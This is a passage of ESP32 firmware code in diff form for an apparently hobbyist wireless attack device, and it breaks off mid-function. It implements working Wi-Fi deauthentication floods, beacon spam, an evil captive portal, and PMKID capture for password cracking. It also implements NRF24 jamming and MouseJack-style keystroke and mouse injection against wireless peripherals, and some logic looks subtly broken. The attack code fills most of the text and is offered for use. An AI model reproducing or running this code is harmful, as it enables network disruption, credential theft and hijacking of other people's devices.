+void handleNavigation(int clicks, bool isLongPress) {
+  if (isLongPress) {
+    toggleAction();
+    return;
+  }
+  
+  if (actionRunning) return;
+  
+  listScrollOffset = 0;
+  
+  if (clicks == 1) {
+    currentMode = (Mode)((currentMode + 1) % MODE_COUNT);
+    currentSubMode = 0;
+    statusMessage = "Mode: " + String(currentMode);
+    statusMessageTime = millis();
+  } else if (clicks == 2) {
+    switch (currentMode) {
+      case MODE_WIFI: 
+        currentSubMode = (currentSubMode + 1) % WIFI_SUB_COUNT;
+        break;
+      case MODE_NRF:  
+        currentSubMode = (currentSubMode + 1) % NRF_SUB_COUNT;  
+        break;
+      case MODE_RF:   
+        currentSubMode = (currentSubMode + 1) % RF_SUB_COUNT;
+        if ((RFSubMode)currentSubMode == RF_SET_FREQ) {
+          rfState.freqIndex = (rfState.freqIndex + 1) % 8;
+          rfState.currentFreq = rfState.frequencies[rfState.freqIndex];
+          if (cc1101Connected) {
+            switchToHSPI();
+            ELECHOUSE_cc1101.setMHZ(rfState.currentFreq);
+            switchToVSPI();
+          }
+        } 
+        break;
+      case MODE_IR: 
+        currentSubMode = (currentSubMode + 1) % IR_SUB_COUNT; 
+        break;
+      case MODE_STORAGE: 
+        currentSubMode = (currentSubMode + 1) % STORAGE_SUB_COUNT; 
+        break;
+      default: 
+        break;
+    }
+    statusMessage = "SubMode: " + String(currentSubMode);
+    statusMessageTime = millis();
+  }
+}
+
+void toggleAction() {
+  actionRunning = !actionRunning;
+  
+  if (!actionRunning) {
+    stopAllActions();
+    statusMessage = "Stopped";
+  } else {
+    // Reset counters and states
+    packetsSentCount = 0; 
+    wifiDeviceCount = 0; 
+    probeCount = 0; 
+    pmkid_count = 0; 
+    deauth_event_count = 0; 
+    captured_creds = "";
+    mgmt_count = 0; 
+    ctrl_count = 0; 
+    data_count = 0;
+    nrfState.sniff_result_count = 0;
+    rfState.captureCount = 0; 
+    rfState.rolljam_state = RJ_START; 
+    irState.macro_count = 0;
+    file_count = 0;
+    notification_sent = false;
+    
+    stopAllActions();
+    
+    if (currentMode == MODE_WIFI) {
+      WiFi.mode(WIFI_STA);
+      WiFi.disconnect();
+      if ((WiFiSubMode)currentSubMode != WIFI_EVIL_PORTAL && 
+          (WiFiSubMode)currentSubMode != WIFI_WEB_UI) {
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
+      }
+    }
+    
+    statusMessage = "Started";
+  }
+  
+  statusMessageTime = millis();
+  
+  // Log action
+  if (spiffs_mounted) {
+    File logFile = SPIFFS.open("/logs/actions.log", FILE_APPEND);
+    if (logFile) {
+      logFile.printf("[%lu] Action %s: Mode=%d, SubMode=%d\n", 
+                    millis(), actionRunning ? "START" : "STOP", 
+                    currentMode, currentSubMode);
+      logFile.close();
+    }
+  }
+}
+
+void stopAllActions() {
+  webServer.stop(); 
+  dnsServer.stop();
+  webSocket.disconnect();
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_OFF);
+  
+  switchToVSPI();
+  if (nrfConnected) {
+    radio.stopListening();
+    nrfState.continuous_jam = false;
+  }
+  
+  switchToHSPI();
+  if (cc1101Connected) {
+    ELECHOUSE_cc1101.SetRx();
+    rfState.continuous_jam = false;
+  }
+  switchToVSPI();
+  
+  irState.continuous_jam = false;
+  dataTransferActive = false;
+}
+
+void runActiveModes() {
+  switch(currentMode) {
+    case MODE_WIFI: 
+      runWiFiMode(); 
+      break;
+    case MODE_NRF: 
+      runNRFMode(); 
+      break;
+    case MODE_RF: 
+      runRFMode(); 
+      break;
+    case MODE_IR: 
+      runIRMode(); 
+      break;
+    case MODE_STORAGE: 
+      runStorageMode(); 
+      break;
+  }
+}
+void IRAM_ATTR promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!actionRunning) return;
+  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
+  if (p->rx_ctrl.sig_mode) return;
+
+  switch(type) {
+    case WIFI_PKT_MGMT: mgmt_count++; break;
+    case WIFI_PKT_CTRL: ctrl_count++; break;
+    case WIFI_PKT_DATA: data_count++; break;
+    default: break;
+  }
+  
+  if (currentMode == MODE_WIFI) {
+    uint8_t subtype = (p->payload[0] & 0b00111100) >> 2;
+    if ((WiFiSubMode)currentSubMode == WIFI_PACKET_MONITOR) {
+      packet_history[packet_history_index].mac_src = "";
+      for(int i=0; i<6; i++) { 
+        packet_history[packet_history_index].mac_src += String(p->payload[10+i], HEX); 
+        if (i<5) packet_history[packet_history_index].mac_src += ":";
+      }
+      if (type == WIFI_PKT_MGMT) packet_history[packet_history_index].type = "MGMT";
+      else if (type == WIFI_PKT_CTRL) packet_history[packet_history_index].type = "CTRL";
+      else if (type == WIFI_PKT_DATA) packet_history[packet_history_index].type = "DATA";
+      else packet_history[packet_history_index].type = "OTHER";
+      packet_history[packet_history_index].channel = p->rx_ctrl.channel;
+      packet_history[packet_history_index].rssi = p->rx_ctrl.rssi;
+      packet_history[packet_history_index].timestamp = millis();
+      packet_history_index = (packet_history_index + 1) % 10;
+    } else if((WiFiSubMode)currentSubMode == WIFI_PROBE_SNIFF && subtype == 4 && probeCount<20) {
+      uint8_t* mac=p->payload+10;
+      bool found=false;
+      for(int i=0;i<probeCount;i++)if(memcmp(probeList[i].mac,mac,6)==0)found=true;
+      if(!found){
+        memcpy(probeList[probeCount].mac,mac,6);
+        int len=p->payload[25];
+        if(len>0&&len<=32){
+          char s[33];
+          memcpy(s,p->payload+26,len);
+          s[len]='\0';
+          probeList[probeCount].ssid=String(s);
+        }else{
+          probeList[probeCount].ssid="*Wildcard*";
+        }
+        probeList[probeCount].rssi = p->rx_ctrl.rssi;
+        probeList[probeCount].timestamp = millis();
+        probeCount++;
+      }
+    } else if((WiFiSubMode)currentSubMode == WIFI_PMKID_SNIFF && p->payload[30]==0x88 && p->payload[31]==0x8e && pmkid_count<10) {
+      uint8_t* ap_mac=p->payload+10;
+      uint8_t* client_mac=p->payload+4;
+      int index=-1;
+      for(int i=0;i<pmkid_count;i++)if(memcmp(pmkids[i].client_mac,client_mac,6)==0)index=i;
+      if(index==-1 && p->payload[87] == 0xdd && p->payload[89] == 0x00 && p->payload[90] == 0x0f && p->payload[91] == 0xac && p->payload[92] == 0x04) {
+        index=pmkid_count++;
+        memcpy(pmkids[index].client_mac,client_mac,6);
+        memcpy(pmkids[index].ap_mac,ap_mac,6);
+        char pmkid_str[33];
+        for(int i=0;i<16;i++) sprintf(&pmkid_str[i*2], "%02x", p->payload[93+i]);
+        pmkids[index].pmkid = String(pmkid_str);
+        pmkids[index].timestamp = String(millis());
+      }
+    } else if ((WiFiSubMode)currentSubMode == WIFI_DEAUTH_DETECTOR && subtype == 12 && deauth_event_count < 15) {
+      memcpy(deauth_events[deauth_event_count].mac, p->payload + 4, 6);
+      deauth_events[deauth_event_count].time = millis();
+      deauth_events[deauth_event_count].channel = p->rx_ctrl.channel;
+      deauth_events[deauth_event_count].rssi = p->rx_ctrl.rssi;
+      
+      // Try to extract SSID from deauth frame if available
+      if (p->rx_ctrl.sig_len > 30) {
+        char ssid[33] = {0};
+        int ssid_len = p->payload[61];
+        if (ssid_len > 0 && ssid_len <= 32) {
+          memcpy(ssid, &p->payload[62], ssid_len);
+          deauth_events[deauth_event_count].target_ssid = String(ssid);
+        }
+      }
+      
+      deauth_event_count++;
+      statusMessage = "DEAUTH DETECTED!";
+      statusMessageTime = millis();
+    }
+  }
+}
+
+void improvedWiFiScan() {
+  if(WiFi.scanComplete() == -2) {
+    WiFi.scanNetworks(true, true, false, 300);
+  } else if (WiFi.scanComplete() >= 0) {
+    int n = WiFi.scanComplete();
+    wifiDeviceCount = min(n, 30);
+    if (wifiDeviceCount == 0) {
+      statusMessage = "No APs Found";
+      statusMessageTime = millis();
+    } else {
+      for(int i=0; i<wifiDeviceCount; i++){
+        wifiList[i].ssid = WiFi.SSID(i);
+        wifiList[i].rssi = WiFi.RSSI(i);
+        wifiList[i].selected = false;
+        
+        // Get BSSID and channel
+        wifi_ap_record_t ap_info;
+        if(esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
+          memcpy(wifiList[i].bssid, ap_info.bssid, 6);
+          wifiList[i].channel = ap_info.primary;
+          
+          // Determine encryption type
+          if(ap_info.authmode == WIFI_AUTH_OPEN) {
+            wifiList[i].encryption = "Open";
+          } else if(ap_info.authmode == WIFI_AUTH_WEP) {
+            wifiList[i].encryption = "WEP";
+          } else if(ap_info.authmode == WIFI_AUTH_WPA_PSK) {
+            wifiList[i].encryption = "WPA";
+          } else if(ap_info.authmode == WIFI_AUTH_WPA2_PSK) {
+            wifiList[i].encryption = "WPA2";
+          } else if(ap_info.authmode == WIFI_AUTH_WPA_WPA2_PSK) {
+            wifiList[i].encryption = "WPA/WPA2";
+          } else {
+            wifiList[i].encryption = "Other";
+          }
+        }
+      }
+      statusMessage = "Scan Complete";
+      statusMessageTime = millis();
+    }
+  }
+}
+
+// AGGRESSIVE DEAUTH ATTACK - YOUR ORIGINAL FUNCTION
+void aggressiveDeauthAttack() {
+  uint8_t deauth_packets[5][26] = {
+    {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00},
+    {0xA0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00},
+    {0xB0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00},
+    {0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00},
+    {0xA0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00}
+  };
+  
+  // Target specific networks from scan results or broadcast
+  if (wifiDeviceCount > 0) {
+    // Use scanned networks
+    for(int i = 0; i < min(3, wifiDeviceCount); i++) {
+      for(int p = 0; p < 5; p++) {
+        // Randomize MAC addresses but keep target BSSID
+        for(int j = 4; j < 10; j++) deauth_packets[p][j] = esp_random() & 0xFF;
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packets[p], sizeof(deauth_packets[p]), false);
+        packetsSentCount++;
+        delay(1);
+      }
+    }
+  } else {
+    // Broadcast deauth to all networks
+    for(int i = 0; i < 5; i++) {
+      for(int j = 4; j < 10; j++) deauth_packets[i][j] = esp_random() & 0xFF;
+      for(int j = 10; j < 16; j++) deauth_packets[i][j] = esp_random() & 0xFF;
+      esp_wifi_80211_tx(WIFI_IF_STA, deauth_packets[i], sizeof(deauth_packets[i]), false);
+      packetsSentCount++;
+    }
+    delay(1);
+  }
+}
+
+// MASS DEAUTH ATTACK - NEW ENHANCED FUNCTION
+void massDeauthAttack() {
+  uint8_t deauth_packet[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+                              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 
+                              0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00};
+  
+  // Send to all channels rapidly
+  static int current_channel = 1;
+  esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
+  
+  // Send multiple deauth packets per channel
+  for (int i = 0; i < 10; i++) {
+    // Randomize source MAC
+    for(int j = 4; j < 10; j++) deauth_packet[j] = esp_random() & 0xFF;
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    packetsSentCount++;
+    
+    // Small delay between packets
+    delayMicroseconds(500);
+  }
+  
+  // Move to next channel
+  current_channel = (current_channel % 14) + 1;
+}
+
+// TARGETED DEAUTH ATTACK - NEW ENHANCED FUNCTION
+void targetedDeauthAttack() {
+  if (wifiDeviceCount == 0) return;
+  
+  uint8_t deauth_packet[26] = {0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                              0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00};
+  
+  // Target only selected networks
+  for (int i = 0; i < wifiDeviceCount; i++) {
+    if (wifiList[i].selected) {
+      // Set channel
+      esp_wifi_set_channel(wifiList[i].channel, WIFI_SECOND_CHAN_NONE);
+      
+      // Set target BSSID (receiver address)
+      memcpy(&deauth_packet[4], wifiList[i].bssid, 6);
+      
+      // Randomize source MAC (transmitter address)
+      for(int j = 10; j < 16; j++) deauth_packet[j] = esp_random() & 0xFF;
+      
+      // Send deauth packet
+      esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+      packetsSentCount++;
+      
+      // Small delay between packets
+      delayMicroseconds(100);
+    }
+  }
+}
+
+void handlePacketInjection() {
+  // Create a simple beacon frame for injection
+  uint8_t beacon_packet[100] = {
+    0x80, 0x00, // Frame Control
+    0x00, 0x00, // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (broadcast)
+    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source MAC
+    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // BSSID
+    0x00, 0x00, // Sequence control
+    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // Timestamp
+    0x64, 0x00, // Beacon interval
+    0x01, 0x04, // Capability info
+    // SSID
+    0x00, 0x08, 'T', 'E', 'S', 'T', '_', 'A', 'P',
+    // Supported rates
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    // DS Parameter set
+    0x03, 0x01, 0x01
+  };
+  
+  // Update MAC addresses with random values
+  for(int i=4; i<10; i++) beacon_packet[i] = esp_random() & 0xFF;
+  for(int i=10; i<16; i++) beacon_packet[i] = esp_random() & 0xFF;
+  for(int i=16; i<22; i++) beacon_packet[i] = beacon_packet[i-6];
+  
+  // Inject the packet
+  esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, 50, false);
+  packetsSentCount++;
+  
+  statusMessage = "Packet Injected";
+  statusMessageTime = millis();
+}
+
+void runWiFiMode() {
+  if ((WiFiSubMode)currentSubMode >= WIFI_BEACON_SPAM && (WiFiSubMode)currentSubMode != WIFI_EVIL_PORTAL && (WiFiSubMode)currentSubMode != WIFI_WEB_UI) {
+    if (millis() - lastChannelHop > 250) {
+      uint8_t primary_channel;
+      wifi_second_chan_t second_channel;
+      if (esp_wifi_get_channel(&primary_channel, &second_channel) == ESP_OK) {
+        int ch = (primary_channel % 13) + 1;
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      }
+      lastChannelHop = millis();
+    }
+  }
+  
+  switch((WiFiSubMode)currentSubMode){
+    case WIFI_SCAN:
+      improvedWiFiScan();
+      break;
+    case WIFI_PACKET_MONITOR:
+    case WIFI_PROBE_SNIFF: 
+    case WIFI_PMKID_SNIFF: 
+    case WIFI_DEAUTH_DETECTOR: 
+      break;
+    case WIFI_BEACON_SPAM: {
+      const char* default_names[] = {
+        "Free_WiFi", "Airport_Free_WiFi", "Starbucks_Free_WiFi", "Hotel_Guest_WiFi",
+        "McDonald's_Free_WiFi", "Public_WiFi", "Secure_WiFi_Network", "Home_Network",
+        "Office_Network", "Guest_Network", "TP-Link_Network", "Linksys_Network",
+        "Netgear_Network", "ASUS_Network", "D-Link_Network"
+      };
+      char ssid[33];
+      if (wifiDeviceCount > 0) {
+        int idx = random(wifiDeviceCount);
+        strncpy(ssid, wifiList[idx].ssid.c_str(), 32);
+        ssid[32] = '\0';
+      } else {
+        strncpy(ssid, default_names[random(15)], 32);
+        ssid[32] = '\0';
+      }
+      
+      uint8_t beacon_packet[100];
+      beacon_packet[0] = 0x80;
+      beacon_packet[1] = 0x00; memset(&beacon_packet[2], 0, 14);
+      beacon_packet[4] = 0xFF; beacon_packet[5] = 0xFF; beacon_packet[6] = 0xFF; beacon_packet[7] = 0xFF;
+      beacon_packet[8] = 0xFF; beacon_packet[9] = 0xFF;
+      for(int i=0; i<6; i++) beacon_packet[10+i] = esp_random() & 0xFF;
+      for(int i=0; i<6; i++) beacon_packet[16+i] = beacon_packet[10+i];
+      beacon_packet[22] = 0x00; beacon_packet[23] = 0x00;
+      memset(&beacon_packet[24], 0, 12);
+      beacon_packet[36] = 0;
+      beacon_packet[37] = strlen(ssid);
+      memcpy(&beacon_packet[38], ssid, strlen(ssid));
+      esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, 38 + strlen(ssid), false);
+      packetsSentCount++;
+      delay(10);
+    } break;
+    case WIFI_BEACON_RICKROLL: {
+      const char* lyrics[] = {"Never gonna give you up", "Never gonna let you down", "Never gonna run around", "and desert you"};
+      static int line = 0;
+      char ssid[33]; strncpy(ssid, lyrics[line], 32); ssid[32] = '\0';
+      uint8_t beacon_rick[100];
+      beacon_rick[0] = 0x80;
+      beacon_rick[1] = 0x00; memset(&beacon_rick[2], 0, 14);
+      beacon_rick[4] = 0xFF; beacon_rick[5] = 0xFF; beacon_rick[6] = 0xFF; beacon_rick[7] = 0xFF;
+      beacon_rick[8] = 0xFF; beacon_rick[9] = 0xFF;
+      for(int i=0; i<6; i++) beacon_rick[10+i] = esp_random() & 0xFF;
+      for(int i=0; i<6; i++) beacon_rick[16+i] = beacon_rick[10+i];
+      beacon_rick[22] = 0x00; beacon_rick[23] = 0x00;
+      memset(&beacon_rick[24], 0, 12);
+      beacon_rick[36] = 0;
+      beacon_rick[37] = strlen(ssid);
+      memcpy(&beacon_rick[38], ssid, strlen(ssid));
+      esp_wifi_80211_tx(WIFI_IF_STA, beacon_rick, 38 + strlen(ssid), false);
+      packetsSentCount++; line = (line + 1) % 4;
+      delay(10);
+    } break;
+    case WIFI_DEAUTH:
+      aggressiveDeauthAttack();
+      break;
+    case WIFI_MASS_DEAUTH:
+      massDeauthAttack();
+      break;
+    case WIFI_TARGETED_DEAUTH:
+      targetedDeauthAttack();
+      break;
+    case WIFI_BEACON_FLOOD: {
+      // Flood with beacons on all channels
+      static int flood_channel = 1;
+      esp_wifi_set_channel(flood_channel, WIFI_SECOND_CHAN_NONE);
+      
+      for (int i = 0; i < 5; i++) {
+        char ssid[33];
+        snprintf(ssid, 32, "FLOOD_%d_%d", flood_channel, i);
+        
+        uint8_t beacon_packet[100];
+        beacon_packet[0] = 0x80;
+        beacon_packet[1] = 0x00; memset(&beacon_packet[2], 0, 14);
+        beacon_packet[4] = 0xFF; beacon_packet[5] = 0xFF; beacon_packet[6] = 0xFF; beacon_packet[7] = 0xFF;
+        beacon_packet[8] = 0xFF; beacon_packet[9] = 0xFF;
+        for(int j=0; j<6; j++) beacon_packet[10+j] = esp_random() & 0xFF;
+        for(int j=0; j<6; j++) beacon_packet[16+j] = beacon_packet[10+j];
+        beacon_packet[22] = 0x00; beacon_packet[23] = 0x00;
+        memset(&beacon_packet[24], 0, 12);
+        beacon_packet[36] = 0;
+        beacon_packet[37] = strlen(ssid);
+        memcpy(&beacon_packet[38], ssid, strlen(ssid));
+        esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, 38 + strlen(ssid), false);
+        packetsSentCount++;
+      }
+      
+      flood_channel = (flood_channel % 14) + 1;
+    } break;
+    case WIFI_PACKET_INJECT:
+      handlePacketInjection();
+      delay(100);
+      break;
+    case WIFI_EVIL_PORTAL:{
+      if(WiFi.softAPgetStationNum()==0 && webServer.client().localIP()==INADDR_NONE){
+        WiFi.mode(WIFI_AP);
+        WiFi.softAP(portal_ssid);
+        delay(100);
+        dnsServer.start(53,"*",WiFi.softAPIP());
+        
+        webServer.on("/", handlePortalRoot);
+        webServer.on("/login", handlePortalRoot);
+        webServer.on("/upload", HTTP_POST, []() {
+          webServer.send(200, "text/plain", "Upload complete");
+        }, handleFileUpload);
+        webServer.on("/download", handleFileDownload);
+        webServer.on("/toggle_html", handleHTMLToggle);
+        webServer.on("/settings", handleEvilPortalSettings);
+        webServer.onNotFound(handlePortalRoot);
+        
+        webServer.begin();
+        statusMessage = "Portal Started";
+        statusMessageTime = millis();
+      }
+      dnsServer.processNextRequest();
+      webServer.handleClient();
+    } break;
+    case WIFI_WEB_UI:{
+      if(WiFi.softAPgetStationNum()==0 && webServer.client().localIP()==INADDR_NONE){
+        WiFi.mode(WIFI_AP);
+        WiFi.softAP("chongketzey", "hacktheworld");
+        delay(100);
+        dnsServer.start(53,"*",WiFi.softAPIP());
+        
+        // ===== COMPLETE WEB SERVER SETUP =====
+webServer.on("/", handleWebRequests);
+webServer.on("/upload", HTTP_POST, []() {
+  webServer.send(200, "text/plain", "Upload complete");
+}, handleFileUpload);
+webServer.on("/download", handleDownloadFile);
+webServer.on("/delete", handleDeleteFile);
+webServer.on("/firmware", HTTP_POST, []() {
+  webServer.send(200, "text/plain", "Update Complete. Rebooting...");
+}, handleFirmwareUpload);
+webServer.on("/reboot", handleSystemReboot);
+webServer.on("/spectrum", handleSpectrumWeb);
+webServer.on("/spectrum_data", handleSpectrumDataJSON);
+webServer.on("/transfer", handleDataTransfer);
+webServer.on("/toggle_html", handleHTMLToggle);
+webServer.on("/settings", handleEvilPortalSettings);
+webServer.onNotFound(handleWebRequests);
+        
+        webServer.begin();
+        statusMessage = "Web UI Started";
+        statusMessageTime = millis();
+      }
+      dnsServer.processNextRequest();
+      webServer.handleClient();
+    } break;
+  }
+}
+void handleNRFPacketAnalyzer() {
+  if(!nrfConnected) return;
+  
+  switchToVSPI();
+  radio.startListening();
+  delayMicroseconds(500);
+  
+  if(radio.available()) {
+    uint8_t buffer[32];
+    uint8_t len = radio.getDynamicPayloadSize();
+    if(len > 0 && len <= 32) {
+      radio.read(buffer, len);
+      
+      // Store the packet
+      nrfState.last_packet_len = len;
+      memcpy(nrfState.last_packet, buffer, len);
+      nrfState.last_packet_time = millis();
+      
+      // Add to sniff results
+      if(nrfState.sniff_result_count < 10) {
+        nrfState.sniff_results[nrfState.sniff_result_count].channel = radio.getChannel();
+        nrfState.sniff_results[nrfState.sniff_result_count].data_rate = 
+          (radio.getDataRate() == RF24_250KBPS) ? "250Kbps" : 
+          (radio.getDataRate() == RF24_1MBPS) ? "1Mbps" : "2Mbps";
+        nrfState.sniff_results[nrfState.sniff_result_count].rssi = radio.testRPD() ? 1 : 0;
+        
+      // Convert address to string
+char addr_str[20] = "UNKNOWN";
+// RF24 library doesn't have getReceivedAddress() method
+// You'll need to implement address capture differently
+sprintf(addr_str, "%02X:%02X:%02X:%02X:%02X", 
+        nrfState.fuzz_addr[0], nrfState.fuzz_addr[1], 
+        nrfState.fuzz_addr[2], nrfState.fuzz_addr[3], 
+        nrfState.fuzz_addr[4]);
+nrfState.sniff_results[nrfState.sniff_result_count].addr = String(addr_str);
+        nrfState.sniff_results[nrfState.sniff_result_count].addr = String(addr_str);
+        
+        // Convert payload to hex string
+        String payloadStr = "";
+        for(int i=0; i<len; i++) {
+          char hex[3];
+          sprintf(hex, "%02X", buffer[i]);
+          payloadStr += hex;
+          if(i < len-1) payloadStr += " ";
+        }
+        nrfState.sniff_results[nrfState.sniff_result_count].payload = payloadStr;
+        nrfState.sniff_results[nrfState.sniff_result_count].timestamp = String(millis());
+        
+        nrfState.sniff_result_count++;
+      }
+    }
+  }
+  radio.stopListening();
+}
+
+// CONTINUOUS NRF JAMMING - NEW ENHANCED FUNCTION
+void nrfContinuousJamming() {
+  if(!nrfConnected) return;
+  
+  switchToVSPI();
+  radio.stopListening();
+  
+  // Cycle through all channels for broad-spectrum jamming
+  static int jam_channel = 0;
+  radio.setChannel(jam_channel);
+  
+  // Use different patterns for more effective jamming
+  radio.write(nrfState.jam_patterns[nrfState.current_jam_pattern], 32);
+  nrfState.packetsSentCount++;
+  
+  // Change pattern periodically
+  static unsigned long lastPatternChange = 0;
+  if(millis() - lastPatternChange > 100) {
+    nrfState.current_jam_pattern = (nrfState.current_jam_pattern + 1) % 8;
+    lastPatternChange = millis();
+  }
+  
+  // Move to next channel
+  jam_channel = (jam_channel + 1) % 126;
+}
+
+// CHANNEL HOP JAMMING - NEW ENHANCED FUNCTION
+void nrfChannelHopJamming() {
+  if(!nrfConnected) return;
+  
+  switchToVSPI();
+  radio.stopListening();
+  
+  // Focus on common NRF24 channels
+  static const uint8_t common_channels[] = {2, 10, 26, 40, 60, 75, 100};
+  static int channel_index = 0;
+  
+  radio.setChannel(common_channels[channel_index]);
+  radio.write(nrfState.jam_patterns[0], 32);
+  nrfState.packetsSentCount++;
+  
+  // Change channel
+  channel_index = (channel_index + 1) % (sizeof(common_channels)/sizeof(common_channels[0]));
+}
+
+// AUTO EXPLOIT - NEW ENHANCED FUNCTION
+void nrfAutoExploit() {
+  if(!nrfConnected) return;
+  
+  switchToVSPI();
+  
+  // Listen briefly
+  radio.startListening();
+  delayMicroseconds(300);
+  
+  if(radio.available()) {
+    // If we detect traffic, try to exploit
+    uint8_t buffer[32];
+    uint8_t len = radio.getDynamicPayloadSize();
+    if(len > 0) {
+      radio.read(buffer, len);
+      
+      // Try common exploit patterns
+      radio.stopListening();
+      
+      // Mouse movement injection
+      uint8_t mouse_payload[] = {0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00};
+      radio.write(mouse_payload, sizeof(mouse_payload));
+      nrfState.packetsSentCount++;
+      
+      // Keyboard injection
+      uint8_t keyboard_payload[] = {0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00}; // 'R' key
+      radio.write(keyboard_payload, sizeof(keyboard_payload));
+      nrfState.packetsSentCount++;
+      
+      delay(100);
+      
+      // Release keys
+      uint8_t release_payload[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+      radio.write(release_payload, sizeof(release_payload));
+      nrfState.packetsSentCount++;
+    }
+  }
+  radio.stopListening();
+}
+
+void runNRFMode(){
+  if(!nrfConnected){actionRunning=false;return;}
+  switchToVSPI();
+  switch((NRFSubMode)currentSubMode){
+    case NRF_SPECTRUM: 
+      for (int i = 0; i < 126; i++) {
+        radio.setChannel(i);
+        radio.startListening();
+        delayMicroseconds(500);
+        radio.stopListening();
+        int current_signal = radio.testCarrier() ? random(60, 100) : random(0, 20);
+        nrfState.signalStrength[i] = current_signal;
+        if (current_signal > nrfState.peakStrength[i]) {
+          nrfState.peakStrength[i] = current_signal;
+        } else {
+          nrfState.peakStrength[i] = max(0, nrfState.peakStrength[i] - 2);
+        }
+      }
+      break;
+    case NRF_PROMISC_SNIFF:{
+      static int ch=0;
+      static int rate_index=0;
+      const rf24_datarate_e rates[] = {RF24_250KBPS, RF24_1MBPS, RF24_2MBPS};
+      radio.setChannel(ch);
+      radio.setDataRate(rates[rate_index]);
+      radio.startListening();
+      delayMicroseconds(500);
+      if(radio.available()){
+        if(nrfState.sniff_result_count < 10) {
+          nrfState.sniff_results[nrfState.sniff_result_count].channel = ch;
+          nrfState.sniff_results[nrfState.sniff_result_count].data_rate = (rate_index == 0) ? "250Kbps" : (rate_index == 1) ? "1Mbps" : "2Mbps";
+          nrfState.sniff_result_count++;
+        }
+        while(radio.available()) { uint8_t buf[32]; radio.read(&buf, 32); }
+      }
+      radio.stopListening();
+      ch = (ch + 1) % 126;
+      if(ch == 0) rate_index = (rate_index + 1) % 3;
+    }break;
+    case NRF_MOUSE_JACK:{
+      radio.stopListening();
+      static const uint8_t ch[]={3,5,6,9,11,12,15,17,18,21,23,24,27,29,30,33,35,36,39,41,42,45,47,48,51,53,54,57,59,60,63,65,66,69,71,72,75,77,78};
+      radio.setChannel(ch[esp_random()%sizeof(ch)]);
+      uint8_t p[]={0,0,4,5,0,0,0,0,0};
+      p[2]=esp_random()%2?4:0xfc;
+      p[3]=esp_random()%2?4:0xfc;
+      radio.write(&p,sizeof(p));
+      nrfState.packetsSentCount++;
+      delay(5);
+    }break;
+    case NRF_KEYSTROKE_INJECT:{
+      // Enhanced keystroke injection for Logitech devices
+      radio.stopListening();
+      const byte address[5] = {0xBB, 0xBB, 0xBB, 0xBB, 0xBB};
+      radio.openWritingPipe(address);
+      radio.setChannel(40);
+      
+      // Enhanced keystroke injection with multiple key options
+      static int key_index = 0;
+      const uint8_t keys[] = {0x15, 0x1E, 0x21, 0x23, 0x24, 0x2B, 0x34, 0x33, 0x36, 0x3D}; // R, A, F, D, E, L, O, H, J, C
+      
+      uint8_t payload[] = {0, 0, keys[key_index], 0, 0, 0, 0, 0};
+      radio.write(&payload, sizeof(payload));
+      nrfState.packetsSentCount++;
+      delay(100);
+      
+      uint8_t release[] = {0, 0, 0, 0, 0, 0, 0, 0};
+      radio.write(&release, sizeof(release));
+      nrfState.packetsSentCount++;
+      
+      key_index = (key_index + 1) % 10;
+      delay(1000);
+      statusMessage = "Keystroke Sent";
+      statusMessageTime = millis();
+    }break;
+    case NRF_ADDR_FUZZ: 
+      if(nrfState.sniff_result_count > 0) { 
+        radio.stopListening();
